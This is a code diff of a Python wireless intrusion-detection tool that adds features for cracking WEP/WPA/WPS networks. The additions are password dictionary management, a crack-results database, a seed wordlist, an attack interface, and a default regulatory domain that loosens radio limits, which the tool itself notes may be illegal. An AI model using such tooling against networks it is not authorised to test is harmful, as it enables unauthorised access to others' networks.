-    ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE)	
-    readout=str(ps.stdout.read().replace("\n",""))
-    readout=str(readout).lstrip().rstrip()
-    ps.wait();ps.stdout.close()
-    sProc=str(sProc)
-    if str(readout)==str(sProc):
-        os.killpg(int(sProc), signal.SIGTERM)
+    try:
+        cmdLine="ps -eo pid | grep '" + str(sProc) + "'"
+        ps=subprocess.Popen(cmdLine , shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
+        readout=str(ps.stdout.read().replace("\n",""))
+        readout=str(readout).lstrip().rstrip()
+        ps.wait();ps.stdout.close()
+        sProc=str(sProc)
+        if str(readout)==str(sProc):
+            os.killpg(int(sProc), signal.SIGTERM) 
+    except OSError: pass           
 
 def StartProbeESSID(sProbeName):
     printc ("i",fcolor.BGreen + "Probing for [" + fcolor.BRed + str(sProbeName) + fcolor.BGreen + "]....","")
@@ -1652,7 +5472,7 @@ def ResetInterface(CMD):
         printc ("i",fcolor.BGreen + "Shutting down all interfaces .....","")
     ShutdownMonitor()
     KillAllMonitor()
-    CreateMonitor(CMD)
+    CreateMonitor(CMD,"")
     if CMD=="1":
         printc ("i",fcolor.BGreen + "Restarting all interfaces .....","")
     RunAirodump()
@@ -1696,11 +5516,158 @@ def OptControls(HeaderLine):
             RestoreAllSetting()
     return;
 
+def DisplayDictionaryList(ToDisplay):
+    __builtin__.DictionaryList=[]
+    __builtin__.DictionaryListD=[]
+    if IsFileDirExist(DBFile7)=="F":
+	with open(DBFile7,"r") as f:
+	    for line in f:
+                line=line.replace("\n","")
+                sl=len(line)
+                if sl>0:
+                    if len(line)<8:
+                        __builtin__.DictionaryList.append (str(line))
+                        __builtin__.DictionaryListD.append (str(line))
+                    else:
+                        linel=line
+                        lined=line
+                        if linel[:8]=="DEFAULT=":
+                            lined=linel[8:] + fcolor.SWhite + " [" + fcolor.BRed + "Default" + fcolor.SWhite + "]"
+                            linel=linel[8:] 
+                            __builtin__.SELECTED_DICT=linel
+                        __builtin__.DictionaryList.append (str(linel))
+                        __builtin__.DictionaryListD.append (str(lined))
+        if ToDisplay=="1":
+            c=0
+            while c<len(__builtin__.DictionaryList):
+                printc (str(c+1),fcolor.SCyan + __builtin__.DictionaryListD[c],"")
+                c += 1
+
+def OptDictionarySetting(HeaderLine,DisplayHeader):
+    if HeaderLine!="":
+        LineBreak()
+    if DisplayHeader=="1":
+        printc ("+", fcolor.BBlue + "Dictionary Setting","")
+    print tabspacefull + StdColor + "This option allow user to add list of dictionary for passwords cracking..";print ""
+    DisplayDictionaryList("1")
+    print""
+    print tabspacefull + fcolor.BRed + "1/A" + fcolor.SWhite + " - " + fcolor.BYellow + "A" + fcolor.SWhite + "dd dictionary location"
+    print tabspacefull + fcolor.BRed + "2/S" + fcolor.SWhite + " - " + fcolor.BYellow + "S" + fcolor.SWhite + "et default dictionary"
+    print tabspacefull + fcolor.BRed + "2/D" + fcolor.SWhite + " - " + fcolor.BYellow + "D" + fcolor.SWhite + "elete dictionary location"
+    usr_resp=AskQuestion("Select an option","A/S/D","U","RETURN","1")
+    LineBreak()
+    if usr_resp=="1" or usr_resp=="A":
+        dict=AskQuestion("Enter the location of dictionary",fcolor.SGreen + "Default-Return",""," ","")
+        if dict==" ":
+            OptDictionarySetting ("1","1")
+            return
+        if IsFileDirExist(dict)=="F":
+            c=0
+            while c<len(__builtin__.DictionaryList):
+               if str(__builtin__.DictionaryList[c])==dict:
+                   printc ("!!!","Specified dictionary already exist in the list !!!","")
+                   OptDictionarySetting ("1","1")
+                   return
+               c += 1
+            open(DBFile7,"a+b").write(dict + "\n")
+            printc ("i",fcolor.BWhite + "Dictionary location added...","")
+            OptDictionarySetting ("1","1")
+            return
+        else:
+            printc ("!!!","Specified dictionary not found !!!","")
+            OptDictionarySetting ("1","1")
+            return
+    if usr_resp=="2" or usr_resp=="S":
+        usr_resp=AskQuestion("Enter the dictionary to set as default",fcolor.SGreen + "Default-Return",""," ","")
+        if usr_resp==" ":
+            OptDictionarySetting ("1","1")
+            return
+        ToAdd=""
+        if usr_resp.isdigit()==True:
+            usr_resp=int(usr_resp)-1
+            if int(usr_resp)>len(__builtin__.DictionaryList):
+                printc ("!!!","Invalid option !!","")
+            else:
+                SelDict=__builtin__.DictionaryList[usr_resp]
+                __builtin__.SELECTED_DICT=SelDict
+                ToAdd="1"
+        else:
+            c=0
+            while c<len(__builtin__.DictionaryList):
+                if __builtin__.DictionaryList[c]==usr_resp:
+                    SelDict=__builtin__.DictionaryList[c]
+                    __builtin__.SELECTED_DICT=SelDict
+                    ToAdd="1"
+                c += 1
+            if ToAdd=="":
+                printc ("!!!","Specified dictionary not found in list !!","")
+        if ToAdd=="1":
+            open(DBFile7,"w").write("")
+            c=0
+            while c<len(__builtin__.DictionaryList):
+                Default=""
+                if __builtin__.DictionaryList[c]==__builtin__.SELECTED_DICT:
+                    Default="DEFAULT="
+                open(DBFile7,"a+b").write(Default + (__builtin__.DictionaryList[c]) + "\n")
+                c += 1
+            printc ("i",fcolor.BWhite + "Dictionary " + fcolor.BRed + str(__builtin__.SELECTED_DICT) + fcolor.BWhite + " set as default...","")
+            SaveConfig("")
+            OptDictionarySetting ("1","1")
+            return
+    if usr_resp=="3" or usr_resp=="D":
+        if len(__builtin__.DictionaryList)=="1":
+            printc ("!!!","A minimum of 1 dictionary location must be in the list !!!","")
+            OptDictionarySetting ("1","1")
+            return
+        else:
+            usr_resp=AskQuestion("Enter the dictionary to delete",fcolor.SGreen + "Default-Return",""," ","")
+            if usr_resp==" ":
+                OptDictionarySetting ("1","1")
+                return
+            ToDel=""
+            if usr_resp.isdigit()==True:
+                usr_resp=int(usr_resp)-1
+                if int(usr_resp)>len(__builtin__.DictionaryList):
+                    printc ("!!!","Invalid option !!","")
+                else:
+                    SelDict=__builtin__.DictionaryList[usr_resp]
+                    ToDel="1"
+            else:
+                c=0
+                while c<len(__builtin__.DictionaryList):
+                    if __builtin__.DictionaryList[c]==usr_resp:
+                        SelDict=__builtin__.DictionaryList[c]
+                        ToDel="1"
+                    c += 1
+                if ToDel=="":
+                    printc ("!!!","Specified dictionary not found in list !!","")
+            if ToDel=="1":
+                open(DBFile7,"w").write("")
+                c=0
+                if __builtin__.SELECTED_DICT==SelDict:
+                    if __builtin__.DictionaryList[0]!=SelDict:
+                        __builtin__.SELECTED_DICT=__builtin__.DictionaryList[0]
+                    else:
+                        __builtin__.SELECTED_DICT=__builtin__.DictionaryList[1]
+                while c<len(__builtin__.DictionaryList):
+                    Default=""
+                    if __builtin__.DictionaryList[c]!=SelDict:
+                        if __builtin__.DictionaryList[c]==__builtin__.SELECTED_DICT:
+                            Default="DEFAULT="
+                        open(DBFile7,"a+b").write(Default + (__builtin__.DictionaryList[c]) + "\n")
+                    c += 1
+                printc ("i",fcolor.BWhite + "Dictionary " + fcolor.BRed + str(SelDict) + fcolor.BWhite + " deleted from list...","")
+                SaveConfig("")
+                OptDictionarySetting ("1","1")
+                return
+        
+    return
+
 def OptConfiguration(HeaderLine):
     if HeaderLine!="":
         LineBreak()
     printc ("+", fcolor.BBlue + "Application Configuation","")
-    Option0 = tabspacefull + SelBColor + "0" + StdColor + "/" + SelBColor + "D" + StdColor + " - Change Regulatory " + SelColor + "D" + StdColor + "omain\t\t\t" + fcolor.SGreen + "[ Current : " + str(GetRegulatoryDomain()) + " ]\n"
+    Option0 = tabspacefull + SelBColor + "0" + StdColor + "/" + SelBColor + "L" + StdColor + " - Change Regu" + SelColor + "l" + StdColor + "atory Domain\t\t\t" + fcolor.SGreen + "[ Current : " + str(GetRegulatoryDomain()) + " ]\n"
     Option1 = tabspacefull + SelBColor + "1" + StdColor + "/" + SelBColor + "R" + StdColor + " - " + SelColor + "R" + StdColor + "efreshing rate of information\t\t" + fcolor.SGreen + "[ Current : " + str(__builtin__.TIMEOUT) + " sec ]\n"
     Option2 = tabspacefull + SelBColor + "2" + StdColor + "/" + SelBColor + "T" + StdColor + " - " + SelColor + "T" + StdColor + "ime before removing inactive AP/Station\t" + fcolor.SGreen + "[ Current : " + str(HIDE_AFTER_MIN) + " min / " + str(TOTALLY_REMOVE_MIN) + " min]\n"
     Option3 = tabspacefull + SelBColor + "3" + StdColor + "/" + SelBColor + "H" + StdColor + " - " + SelColor + "H" + StdColor + "ide inactive Access Point/Station\t\t" + fcolor.SGreen + "[ Access Point : " + str(__builtin__.HIDE_INACTIVE_SSID) + " / Station : " + str(__builtin__.HIDE_INACTIVE_STN) + " ]\n"
@@ -1709,7 +5676,7 @@ def OptConfiguration(HeaderLine):
     Option6 = tabspacefull + SelBColor + "6" + StdColor + "/" + SelBColor + "A" + StdColor + " - Save PCap when " + SelColor + "A" + StdColor + "ttack detected\t\t" + fcolor.SGreen + "[ Current : " + str(__builtin__.SAVE_ATTACKPKT) + " ]\n"
     Option7 = tabspacefull + SelBColor + "7" + StdColor + "/" + SelBColor + "M" + StdColor + " - Save PCap when " + SelColor + "M" + StdColor + "onitored MAC/Name seen\t" + fcolor.SGreen + "[ Current : " + str(__builtin__.SAVE_MONPKT) + " ]\n"
     Option8 = tabspacefull + SelBColor + "8" + StdColor + "/" + SelBColor + "W" + StdColor + " - " + SelColor + "W" + StdColor + "hitelist Setting (Bypass alert for MAC/Name)\n"
-    Option9 =""
+    Option9 = tabspacefull + SelBColor + "9" + StdColor + "/" + SelBColor + "D" + StdColor + " - " + SelColor + "D" + StdColor + "ictionary Detail and Setting\t\t" + fcolor.SGreen + "[ Current : " + str(__builtin__.SELECTED_DICT) + " ]\n"
     OptionA=Option0 + Option1 + Option2 + Option3  + Option4 + Option5+ Option6  + Option7 + Option8+ Option9
     print OptionA
     usr_resp=AskQuestion("Choose an option","D/R/T/H/B/W/C","U","RETURN","1")
@@ -1717,7 +5684,9 @@ def OptConfiguration(HeaderLine):
         return;
     if usr_resp=="8" or usr_resp=="W":
         OptWhitelist("1","1")
-    if usr_resp=="0" or usr_resp=="D":
+    if usr_resp=="9" or usr_resp=="D":
+        OptDictionarySetting("1","1")
+    if usr_resp=="0" or usr_resp=="L":
         ChangeRegulatoryDomain()
     if usr_resp=="-":
         SaveConfig("1")
@@ -1810,7 +5779,7 @@ def OptWhitelist(HeaderLine,DisplayHeader):
     Option1 = tabspacefull + SelBColor + "1" + StdColor + "/" + SelBColor + "M" + StdColor + " - " + SelColor + "M" + StdColor + "AC Address [BSSID/STATION]\n"
     Option2 = tabspacefull + SelBColor + "2" + StdColor + "/" + SelBColor + "N" + StdColor + " - " + SelColor + "N" + StdColor + "ame of Access Point/Probe Names\n"
     Option3 = tabspacefull + SelBColor + "9" + StdColor + "/" + SelBColor + "C" + StdColor + " - " + SelColor + "C" + StdColor + "lear all Monitoring Items\n"
-    OptionA=Option1 + Option2 + Option3
+    OptionA=Option1 + Option2 + Option3 
     print OptionA
     usr_resp=AskQuestion("Select Whitelist Type : ",STxt + "M / N / C","U","RETURN","1")
     if usr_resp=="RETURN":
@@ -1917,12 +5886,40 @@ def OptMonitorMAC(HeaderLine):
     DisplayMonitoringMAC()
     Option1 = tabspacefull + SelBColor + "1" + StdColor + "/" + SelBColor + "M" + StdColor + " - " + SelColor + "M" + StdColor + "AC Address [BSSID/STATION]\n"
     Option2 = tabspacefull + SelBColor + "2" + StdColor + "/" + SelBColor + "N" + StdColor + " - " + SelColor + "N" + StdColor + "ame of Access Point/Probe Names\n"
-    Option3 = tabspacefull + SelBColor + "9" + StdColor + "/" + SelBColor + "C" + StdColor + " - " + SelColor + "C" + StdColor + "lear all Monitoring Items\n"
-    OptionA=Option1 + Option2 + Option3
+    Option3 = tabspacefull + SelBColor + "3" + StdColor + "/" + SelBColor + "L" + StdColor + " - " + SelColor + "L" + StdColor + "ive Monitoring of Access Point\n"
+    Option4 = tabspacefull + SelBColor + "9" + StdColor + "/" + SelBColor + "C" + StdColor + " - " + SelColor + "C" + StdColor + "lear all Monitoring Items\n"
+    OptionA=Option1 + Option2 + Option3 + Option4
     print OptionA
-    usr_resp=AskQuestion("Select Monitoring Type : ",STxt + "M / N / C","U","RETURN","1")
+    usr_resp=AskQuestion("Select Monitoring Type : ",STxt + "M / N / L / C ","U","RETURN","1")
     if usr_resp=="RETURN":
         return
+    if usr_resp=="L" or usr_resp=="3":
+        printc (" ",fcolor.BRed + "Please note that once the MAC address is enter, active monitoring of all network will be shutdown.","")
+        usr_resp=AskQuestion("Enter the Access Point MAC Address to monitor (xx:xx:xx:xx:xx:xx) " ,"","U","","1")
+        if usr_resp!="":
+            if len(usr_resp)!=17 or IsHex(usr_resp)==False or FindMACIndex(usr_resp,__builtin__.ListInfo_BSSID)==-1:
+                printc ("!!!","Invalid MAC Addresso Entered !","")
+                print ""
+            elif FindMACIndex(usr_resp,__builtin__.ListInfo_BSSID)==-1:
+                printc ("!!!","Access Point MAC Address Not Found !","")
+                printc (" ",fcolor.SGreen + "Please allow Harvester to gather surround network information first before proceeding..","")
+                print ""
+            else:
+                foundloc=FindMACIndex(usr_resp,__builtin__.ListInfo_BSSID)
+                if foundloc!=-1:
+                    __builtin__.ATTACK_AP_BSSID=usr_resp
+                    __builtin__.ATTACK_AP_CH=str(__builtin__.ListInfo_Channel[foundloc])
+                    printc ("i",fcolor.BGreen + "Shutting down all interfaces .....","")
+                    ShutdownMonitor()
+                    KillAllMonitor()
+                    CreateMonitor("1","")
+                    LineBreak()
+                    MonitorAccessPoint(usr_resp,"")
+                    OptMonitorMAC("1")
+                    return
+        else:
+            OptMonitorMAC("1")
+            return
     if usr_resp=="C" or usr_resp=="9":
         open(MonitorMACfile,"w").write("")
         __builtin__.MonitoringMACList=[]
@@ -2021,9 +6018,9 @@ def OptOutputDisplay(CMD):
         Option5 = tabspacefull + SelBColor + "4" + StdColor + "/" + SelBColor + "P" + StdColor + " - Advanced View with " + SelColor + "P" + StdColor + "robes Request (Merging associated Stations with Access Points) - " + fcolor.BYellow + "[Recommended]\n"
         Option6 = tabspacefull + SelBColor + "5" + StdColor + "/" + SelBColor + "O" + StdColor + " - Advanced View with" + SelColor + "o" + StdColor + "ut probing request (Merging associated Stations with Access Points)\n"
         Option7 = tabspacefull + SelBColor + "6" + StdColor + "/" + SelBColor + "C" + StdColor + " - Display one time bar " + SelColor + "c" + StdColor + "hart of Access Points information\n"
-        Option8 = "\n" + tabspacefull + SelBColor + "7" + StdColor + "/" + SelBColor + "C" + StdColor + " - Hide/Show Association/Co" + SelColor + "n" + StdColor + "nection Alert."+ fcolor.SGreen + "[ Current : No ]".rjust(39) + "\n"
-        Option9 = tabspacefull + SelBColor + "8" + StdColor + "/" + SelBColor + "U" + StdColor + " - Hide/Show S" + SelColor + "u" + StdColor + "spicious Activity Listing Alert"+ fcolor.SGreen + "[ Current : Yes ]".rjust(35) + "\n"
-        Option10 = tabspacefull + SelBColor + "9" + StdColor + "/" + SelBColor + "I" + StdColor + " - Hide/Show " + SelColor + "I" + StdColor + "ntrusion Detection/Attacks Alert."+ fcolor.SGreen + "[ Current : Yes ]".rjust(34) + "\n"
+        Option8 = "\n" + tabspacefull + SelBColor + "7" + StdColor + "/" + SelBColor + "C" + StdColor + " - Show Association/Co" + SelColor + "n" + StdColor + "nection Alert.\t\t" + fcolor.SGreen + "[ Current : " + SHOW_CONNECTION_ALERT + " ]" + "\n"
+        Option9 = tabspacefull + SelBColor + "8" + StdColor + "/" + SelBColor + "U" + StdColor + " - Show S" + SelColor + "u" + StdColor + "spicious Activity Listing Alert.\t"  + fcolor.SGreen + "[ Current : " + SHOW_SUSPICIOUS_LISTING + " ]" + "\n"
+        Option10 = tabspacefull + SelBColor + "9" + StdColor + "/" + SelBColor + "I" + StdColor + " - Show " + SelColor + "I" + StdColor + "ntrusion Detection/Attacks Alert.\t" + fcolor.SGreen + "[ Current : " + SHOW_IDS + " ]" + "\n"
         OptionA=Option1 + Option2 + Option3 + Option4  + Option5 + Option6 + Option7 + Option8 + Option9+ Option10 
         print OptionA
         printc (" " , fcolor.BWhite + "Current Setting = " + SelBColor + str(__builtin__.NETWORK_VIEW), "")
@@ -2034,7 +6031,7 @@ def OptOutputDisplay(CMD):
         SaveConfig("1")
     if usr_resp=="0" or usr_resp=="1" or usr_resp=="2" or usr_resp=="3" or usr_resp=="4"  or usr_resp=="5":
       __builtin__.NETWORK_VIEW=usr_resp
-    if usr_resp=="H" or usr_resp=="A" or usr_resp=="S" or usr_resp=="B" or usr_resp=="P"  or usr_resp=="O" or usr_resp=="6" or usr_resp=="C":
+    if usr_resp=="H" or usr_resp=="A" or usr_resp=="S" or usr_resp=="B" or usr_resp=="P"  or usr_resp=="O" or usr_resp=="6" or usr_resp=="C" or usr_resp=="7" or usr_resp=="N" or usr_resp=="8" or usr_resp=="U" or usr_resp=="9" or usr_resp=="I":
         if usr_resp=="H":
             __builtin__.NETWORK_VIEW="0"
         if usr_resp=="A":
@@ -2049,8 +6046,28 @@ def OptOutputDisplay(CMD):
             __builtin__.NETWORK_VIEW="5"
         if usr_resp=="C" or usr_resp=="6":
             DisplayNetworkChart()
-    if CMD!="":
-        printc (" ",fcolor.BGreen + "Display Option Set : " + fcolor.BYellow + str(CMD),"")
+            printc ("x",fcolor.BBlue + "Press a key to continue...","")
+        if usr_resp=="7" or usr_resp=="N":
+            if __builtin__.SHOW_CONNECTION_ALERT=="Yes":
+                __builtin__.SHOW_CONNECTION_ALERT="No"
+            else:
+                __builtin__.SHOW_CONNECTION_ALERT="Yes"
+        if usr_resp=="8" or usr_resp=="U":
+            if __builtin__.SHOW_SUSPICIOUS_LISTING=="Yes":
+                __builtin__.SHOW_SUSPICIOUS_LISTING="No"
+            else:
+                __builtin__.SHOW_SUSPICIOUS_LISTING="Yes"
+        if usr_resp=="9" or usr_resp=="I":
+            if __builtin__.SHOW_IDS=="Yes":
+                __builtin__.SHOW_IDS="No"
+            else:
+                __builtin__.SHOW_IDS="Yes"
+        if CMD!="":
+            printc (" ",fcolor.BGreen + "Display Option Set : " + fcolor.BYellow + str(CMD),"")
+        LineBreak()
+        OptOutputDisplay(CMD)
+        return
+        
     SaveConfig("")
     LineBreak()
     return;
@@ -2146,6 +6163,10 @@ def printc(PrintType, PrintText,PrintText2):
                 ReturnOut="1"
                 lPrintText=lPrintText-6
                 PrintText=PrintText[-lPrintText:]
+    if len(str(PrintType))==1:
+        __builtin__.tabspace="   "
+    else:
+        __builtin__.tabspace="  "
     if __builtin__.PrintToFile=="1" and PrintType!="@" and PrintType!="x" and PrintType!="@^" and firstsixa!="<$rs$>":
         PrintTypep=PrintType
         if PrintTypep=="  " or PrintTypep==" ":
@@ -2213,7 +6234,7 @@ def printc(PrintType, PrintText,PrintText2):
             return bcolor + "   " + __builtin__.tabspace + tcolor + PrintText + PrintText2
     else:
         if ReturnOut!="1":
-            print bcolor + "[" + pcolor + PrintType + bcolor + "]" + __builtin__.tabspace + tcolor + PrintText + PrintText2
+            print bcolor + "[" + pcolor + str(PrintType) + bcolor + "]" + __builtin__.tabspace + tcolor + PrintText + PrintText2
         else:
             return bcolor + "[" + pcolor + PrintType + bcolor + "]" + __builtin__.tabspace + tcolor + PrintText + PrintText2
 
@@ -2231,7 +6252,7 @@ def AskQuestion(QuestionText, ReplyText, ReplyType, DefaultReply, DisplayReply):
     pcolor=fcolor.BYellow
     tcolor=fcolor.BGreen
     if ReplyText!="":
-        Ques=QuestionText + " ( " + pcolor + ReplyText + tcolor + " ) : "
+        Ques=QuestionText + tcolor + " ( " + pcolor + ReplyText + tcolor + " ) : "
         usr_resp=raw_input(bcolor + "[" + pcolor + "?" + bcolor + "]" + __builtin__.tabspace + tcolor + Ques + fcolor.BWhite)
     else:
         usr_resp=raw_input(bcolor + "[" + pcolor + "?" + bcolor + "]" + __builtin__.tabspace + tcolor + QuestionText + " : " + fcolor.BWhite)
@@ -3003,6 +7024,7 @@ def DisplayDescription():
     print fcolor.SWhite + " It also comes with an analyzer and viewer which allow user to further probe and investigation on the intrusion/suspicious packets captured. Additional"
     print fcolor.SWhite + " features such as blacklisting which allow user to monitor specific MACs/Names's activities. All information captured can also be saved into pcap files"
     print fcolor.SWhite + " for further investigation."
+    print fcolor.SWhite + " WAIDPS also provide user with the option of cracking WEP/WPA/WPS access point."
     print fcolor.SWhite + " "
     print ""
 
@@ -3054,6 +7076,7 @@ def GetParameter(cmdDisplay):
     __builtin__.LoopCount=99999999
     __builtin__.SELECTED_IFACE=""
     __builtin__.SELECTED_MON=""
+    __builtin__.SELECTED_ATK=""
     __builtin__.PRINTTOFILE=""
     __builtin__.ASSIGNED_MAC=""
     __builtin__.SPOOF_MAC=""
@@ -3364,7 +7387,13 @@ def ShutdownMonitor():
     ps.wait();ps.stdout.close()
     ps=subprocess.Popen("iw wlmon0 del  > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
     ps.wait();ps.stdout.close()
+    ps=subprocess.Popen("iw " + str(__builtin__.SELECTED_ATK) + " del  > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
+    ps.wait();ps.stdout.close()
+    ps=subprocess.Popen("iw atmon0 del  > /dev/null 2>&1", shell=True, stdout=subprocess.PIPE,stderr=open(os.devnull, 'w'))
+    ps.wait();ps.stdout.close()
     ps=subprocess.Popen("killall 'airodump-ng' > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	
+    time.sleep(0.1)
+    ps=subprocess.Popen("killall 'aircrack-ng' > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	
     time.sleep(0.1)
     ps=subprocess.Popen("killall 'tshark' > /dev/null 2>&1" , shell=True, stdout=subprocess.PIPE)	
     time.sleep(0.1)
@@ -3480,18 +7509,14 @@ class Command(object):
     def run(self, timeout):
 
         def target():
-	    printd ("Thread started")
             self.process = subprocess.Popen(self.cmd, shell=True)
             self.process.communicate()
-	    printd ("Thread Finish")
         thread = threading.Thread(target=target)
         thread.start()
         thread.join(timeout)
         if thread.is_alive():
-	    printd ("Terminating process..")
             self.process.terminate()
             thread.join()
-	    printd ("Process Terminated")
 
 def IsAscii(inputStr):
     return all(ord(c) < 127 and ord(c) > 31 for c in inputStr)
@@ -3558,7 +7583,13 @@ def CheckRequiredFiles():
         printc ("x","Press any key to continue...","")
 
 def CreateDatabaseFiles():
-    if IsFileDirExist(DBFile1)!="F" or IsFileDirExist(DBFile2)!="F" or IsFileDirExist(DBFile3)!="F" or IsFileDirExist(DBFile4)!="F" or IsFileDirExist(DBFile5)!="F" or IsFileDirExist(DBFile6)!="F":
+    FoundDict=""
+    for dictionary in __builtin__.Dictionary:
+        if IsFileDirExist(dictionary)=="F" and FoundDict=="":
+            FoundDict=dictionary
+    if FoundDict!="":
+        __builtin__.DEFAULT_DICT=FoundDict
+    if IsFileDirExist(DBFile1)!="F" or IsFileDirExist(DBFile2)!="F" or IsFileDirExist(DBFile3)!="F" or IsFileDirExist(DBFile4)!="F" or IsFileDirExist(DBFile5)!="F" or IsFileDirExist(DBFile6)!="F" or IsFileDirExist(CrackDB)!="F" or IsFileDirExist(__builtin__.DEFAULT_DICT)!="F"  or IsFileDirExist(DBFile7)!="F":
         print ""
         printc (".",fcolor.BGreen + "Creating database files....","")
         if IsFileDirExist(DBFile1)!="F":
@@ -3579,6 +7610,15 @@ def CreateDatabaseFiles():
         if IsFileDirExist(DBFile6)!="F":
             WriteData="Station;Initial BSSID;New BSSID;Reported;Initial ESSID;New ESSID;\n"
             open(DBFile6,"a+b").write(WriteData)
+        if IsFileDirExist(CrackDB)!="F":
+            WriteData="BSSID;Encryption;Key;ESSID;HS_FILE;WPS;\n"
+            open(CrackDB,"a+b").write(WriteData)
+        if IsFileDirExist(__builtin__.DEFAULT_DICT)!="F":
+            WriteData="passwords\np@55w0rd!!!\n1234abcd\n1a2b3c4d5e\n12345678\n"
+            open(__builtin__.DEFAULT_DICT,"a+b").write(WriteData)
+        if IsFileDirExist(DBFile7)!="F":
+            WriteData="DEFAULT=" + str(__builtin__.DEFAULT_DICT + "\n")
+            open(DBFile7,"a+b").write(WriteData)
         printc (".",fcolor.BGreen + "Done....","")
         print ""
     if os.stat(DBFile1)==0 or os.stat(DBFile2)==0 or os.stat(DBFile3)==0 or os.stat(DBFile4)==0 or os.stat(DBFile5)==0 or os.stat(DBFile1)==6:
@@ -3672,6 +7712,7 @@ def ChangeRegulatoryDomain():
     LineBreak()
     printc ("+",fcolor.BBlue + "Regulatory Domain Configuration","")
     printc (" " ,StdColor + "For a updated list,you may wish to download it from http://linuxwireless.org/download/wireless-regdb.","")
+    printc ("!" ,fcolor.SRed + "Please note that changing the restriction of your wireless interface adapter may be illegal in some country..","")
     printc (" " ,StdColor + "Below is the current Regulatory Domain for this system :","")
     print ""
     ps=subprocess.Popen("iw reg get" , shell=True, stdout=subprocess.PIPE)	
@@ -3679,7 +7720,7 @@ def ChangeRegulatoryDomain():
     CurrentReg=tabspacefull + CurrentReg
     print fcolor.SGreen + CurrentReg
     printc (" ", StdColor + "Most frequency country code [ " + fcolor.BYellow + "BR" + StdColor +" ]/ [" + fcolor.BYellow + "BO" + StdColor + "] / [" + fcolor.BYellow + "JP" + StdColor + "] ","")
-    CountryCode=AskQuestion ("Enter A New Country Code ",fcolor.SWhite + "Default - " + fcolor.BYellow + "JP","U","JP","1")
+    CountryCode=AskQuestion ("Enter A New Country Code ",fcolor.SWhite + "Default - " + fcolor.BYellow + "BO","U","BO","1")
     if CountryCode!="" and len(CountryCode)==2:
         ps=subprocess.Popen("iw reg set " + str(CountryCode) , shell=True, stdout=subprocess.PIPE)	
     else:
@@ -4149,7 +8190,10 @@ def ReportNow():
 def GetSec(timestr):
     timestr=str(timestr)
     l = timestr.split(':')
-    return int(l[0]) * 3600 + int(l[1]) * 60 + int(l[2])
+    if l[0].isdigit()==True:
+        return int(l[0]) * 3600 + int(l[1]) * 60 + int(l[2])
+    else:
+        return 0
 
 def GetMin(timestr):
     timestr=str(timestr)
@@ -4210,7 +8254,7 @@ def DisplayTimeStamp(cmdDisplayType,cmdTimeFormat):
         __builtin__.TimeStop=""
         __builtin__.DTimeStop=""
         __builtin__.DTimeStart=time.strftime(timefmt)
-        printc ("  ",lblColor + "Started\t: " + txtColor + str(__builtin__.DTimeStart),"")
+        printc ("  ",lblColor + " Started\t: " + txtColor + str(__builtin__.DTimeStart),"")
         __builtin__.TimeStart=datetime.datetime.now()
         return __builtin__.DTimeStart;
     if cmdDisplayType=="start-h":
@@ -4221,7 +8265,7 @@ def DisplayTimeStamp(cmdDisplayType,cmdTimeFormat):
         return __builtin__.DTimeStart;
     if cmdDisplayType=="stop":
         __builtin__.DTimeStop=time.strftime(timefmt)
-        printc ("  ",lblColor + "Stopped\t: " + txtColor + str(__builtin__.DTimeStop),"")
+        printc ("  ",lblColor + " Stopped\t: " + txtColor + str(__builtin__.DTimeStop),"")
         __builtin__.TimeStop=datetime.datetime.now()
         return __builtin__.DTimeStop;
     if cmdDisplayType=="stop-h":
@@ -4237,11 +8281,11 @@ def DisplayTimeStamp(cmdDisplayType,cmdTimeFormat):
 	    ElapsedTime=str(ElapsedTime)
 	    ElapsedTime=ElapsedTime[:-4]
             if cmdDisplayType=="summary-a":
-                printc ("  ",lblColor + "Started\t: " + txtColor + str(__builtin__.DTimeStart),"")
-                printc ("  ",lblColor + "Stopped\t: " + txtColor + str(__builtin__.DTimeStop),"")
-	        printc ("  ",lblColor + "Time Spent\t: " + fcolor.BRed + str(ElapsedTime),"")
+                printc ("  ",lblColor + " Started\t: " + txtColor + str(__builtin__.DTimeStart),"")
+                printc ("  ",lblColor + " Stopped\t: " + txtColor + str(__builtin__.DTimeStop),"")
+	        printc ("  ",lblColor + " Time Spent\t: " + fcolor.BRed + str(ElapsedTime),"")
             if cmdDisplayType=="summary":
-	        printc ("  ",lblColor + "Time Spent\t: " + fcolor.BRed + str(ElapsedTime),"")
+	        printc ("  ",lblColor + " Time Spent\t: " + fcolor.BRed + str(ElapsedTime),"")
         return ElapsedTime;
 
 def RewriteCSV():
@@ -4336,7 +8380,7 @@ def DisplayClientList():
                 InfoColor=fcolor.SWhite
             MACCOLOR=InfoColor
             SELFMAC=""
-            if ListInfo_STATION[x]==__builtin__.SELECTED_MANIFACE_MAC or ListInfo_STATION[x]==__builtin__.SELECTED_MON_MAC or ListInfo_STATION[x]==__builtin__.SELECTED_IFACE_MAC:
+            if ListInfo_STATION[x]==__builtin__.SELECTED_MANIFACE_MAC or ListInfo_STATION[x]==__builtin__.SELECTED_MON_MAC or ListInfo_STATION[x]==__builtin__.SELECTED_IFACE_MAC or ListInfo_STATION[x]==__builtin__.SELECTED_ATK_MAC:
                 MACCOLOR=fcolor.BPink
                 SELFMAC=fcolor.BWhite + " [ " + fcolor.BPink + "Your Interface MAC" + fcolor.BWhite + " ]"
             CBSSID=ListInfo_CBSSID[x]
@@ -4382,6 +8426,10 @@ def GetFilterDetail():
         __builtin__.DisplayNetworkFilter=__builtin__.DisplayNetworkFilter + fcolor.BCyan + "Channel - " + fcolor.Pink + str(__builtin__.NETWORK_CHANNEL_FILTER) + "\t"
     if __builtin__.NETWORK_WPS_FILTER!="ALL":
         __builtin__.DisplayNetworkFilter=__builtin__.DisplayNetworkFilter + fcolor.BCyan + "WPS - " + fcolor.Pink + str(__builtin__.NETWORK_WPS_FILTER) + "\t"
+    if __builtin__.NETWORK_ESSID_FILTER!="":
+        __builtin__.DisplayNetworkFilter=__builtin__.DisplayNetworkFilter + fcolor.BCyan + "ESSID - " + fcolor.Pink + str(__builtin__.NETWORK_ESSID_FILTER) + "\t"
+    if __builtin__.NETWORK_BSSID_FILTER!="":
